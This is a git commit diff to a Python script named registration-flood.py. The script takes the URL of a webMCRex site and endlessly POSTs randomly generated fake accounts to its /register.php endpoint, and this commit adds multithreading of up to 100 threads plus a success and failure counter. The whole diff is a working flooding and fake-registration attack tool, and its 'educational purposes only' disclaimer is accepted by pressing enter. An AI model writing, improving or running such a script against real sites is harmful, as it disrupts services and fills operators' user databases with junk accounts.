bef603ba9f3820cba3941bf0e3a471ba8da2807b
Mike_Went <git@meew.me>
2017-10-15 23:50:53 +0300

    Add threads

--- registration-flood.py
+++ registration-flood.py
@@ -1,18 +1,40 @@
 #!/usr/bin/env python3 
 
 import requests
+import threading
 import random
 import string
+import time
 
-disclaimer_agreement = input('I have read disclaimer.text and will use this script for educational purposes only, without making harm to anybody, anywhere, anytime [N/y]: ')
-if disclaimer_agreement not in ('y', 'Y'):
+disclaimer_agreement = input('By pressing enter you confirm that you have read disclaimer.txt and will use this script for educational purposes only, without making harm to anybody, anywhere, anytime.')
+if disclaimer_agreement != '':
     exit('Sorry.')
+print()
 
 print('Enter URL of the webMCRex site. Including protocol, but without slash on the end.')
 print('Example: https://example.com')
 URL = input('URL: ')
 if URL == '' or URL[-1] == '/' or URL[0:4] != 'http':
     exit('IDIOT!')
+
+print('Set amount of threads. Recommended value is 4.')
+THREADS = input('Threads [4]: ')
+if THREADS == '':
+    THREADS = 4
+else:
+    THREADS = int(THREADS)
+if THREADS < 1 or THREADS > 100:
+    exit('WTF A U DOING?')
+
+
+# Generates random string from 5 to 14 symbols length
+def random_string():
+    length = random.randint(5, 14)
+    return ''.join([random.choice(string.ascii_lowercase + string.digits) for _ in range(length)])
+
+# Returns one of the listed providers
+def random_mail_provider():
+    return random.choice(('mail.ru', 'bk.ru', 'gmail.com', 'yandex.ru', 'ya.ru', 'yahoo.com'))
 
 # Stats
 successful_requests = 0
@@ -28,28 +50,34 @@ headers = {
     'Accept-Language': 'en-US,en;q=0.8,ru;q=0.6'
 }
 
-def random_string():
-    length = random.randint(5, 14)
-    return ''.join([random.choice(string.ascii_lowercase + string.digits) for _ in range(length)])
 
-def random_mail_provider():
-    return random.choice(('mail.ru', 'bk.ru', 'gmail.com', 'yandex.ru', 'ya.ru', 'yahoo.com'))
+def flood():
+    global successful_requests, failed_requests, URL
+    while True:
+        salt = random_string()
+        data = {
+            'login': salt,
+            'pass': salt + '1',
+            'repass': salt + '1',
+            'email': random_string() + '@' + random_mail_provider(),
+            'female': random.randint(0, 1)
+        }
+        r = requests.post(URL + '/register.php', headers=headers, data=data)
+        if r.status_code == 200:
+            if '"code":0' in r.text:
+                successful_requests += 1
+        else:
+            failed_requests += 1
 
-# FLOOD!
+# Spawn threads
+for _ in range(THREADS):
+    threading.Thread(target=flood, daemon=True).start()
+
+# Show stats
 while True:
-    password = random_string()
-    data = {
-        'login': random_string(),
-        'pass': password,
-        'repass': password,
-        'email': random_string() + '@' + random_mail_provider(),
-        'female': random.choice((0, 1))
-    }
-    r = requests.post(URL + '/register.php', headers=headers, data=data)
-    if r.status_code == 200:
-        if '"code":0' in r.text:
-            successful_requests += 1
-    else:
-        failed_requests += 1
-        
-    print('Success:', successful_requests, 'Failed:', failed_requests, end='\r')
+    try:
+        print('Successful:', successful_requests, 'Failed:', failed_requests, end='\r')
+        time.sleep(1)
+    except KeyboardInterrupt:
+        print('\n\nStopped.')
+        exit()
